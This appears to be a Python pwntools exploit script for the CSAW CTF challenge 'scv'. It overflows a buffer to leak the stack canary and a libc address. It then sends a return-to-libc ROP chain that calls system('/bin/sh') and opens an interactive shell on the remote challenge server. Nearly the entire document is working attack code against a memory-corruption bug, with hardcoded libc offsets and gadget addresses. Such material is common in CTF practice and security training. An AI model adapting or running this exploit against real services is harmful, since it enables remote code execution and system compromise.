from pwn import *
import struct

#https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/DEFCONCTF/babysfirst/r0pbaby
#context.log_level = 'debug'
elf = ELF('libc-2.23.so')
can = []
def reviewfood(p, pl=''):
    p.sendline('2')
    resp = p.recvuntil('3.MINE MINERALS....\n-------------------------\n')
    print "resp:"+resp
    if len(pl) == 0:
        return
    else:
        idx = resp.find(pl)+len(pl)
        end = resp.find('----', idx)
        return bytearray(resp[idx:end])

def feed(p, pl):
    p.sendline('1')
    p.sendline(pl)
    p.recvuntil('3.MINE MINERALS....\n-------------------------\n')

def gdbattach(p):
    gdb.attach(p,'''
    b *0x0400D74
    continue
    ''')

def leakoffset(p, off):
    pl = 'x'*off
    feed(p, pl)
    addr = reviewfood(p, pl)
    addr = addr[:8]
    return addr

def retlibc(p, can, libcsys, sh, pop):
    pl = 'x'*168+p64(can) + 'a'*8 +p64(pop) + p64(sh) + p64(libcsys)
    feed(p, pl)
    reviewfood(p)

def feedcanary(p,can):
    pl= 'x'*168+str(can)
    feed(p, pl)
    reviewfood(p)

#with process('./scv') as p:
with remote('pwn.chal.csaw.io', 3764) as p:
    global can
    print p.recvuntil('3.MINE MINERALS....\n')
    print p.recvline()
    #gdbattach(p)
    can = leakoffset(p, 8*21)
    can[0] = 0
    print hexdump(can)
    can = struct.unpack("<Q", can)[0]
    libc = leakoffset(p, 183).strip()
    libc = libc+"\0"*(8-len(libc))
    libcadr = struct.unpack("<Q", libc)[0]
    libcsys = libcadr + 0x24B60
    print "canary:"+hex(can)
    print "libsys:"+hex(libcsys)
    libcbase = libcsys - elf.symbols['system']
    libcsh = libcbase + 0x18CD17
    print "libcbase:"+hex(libcbase)
    poprdi = 0x0021102+libcbase
    retlibc(p, can, libcsys, libcsh, poprdi)
    p.interactive()
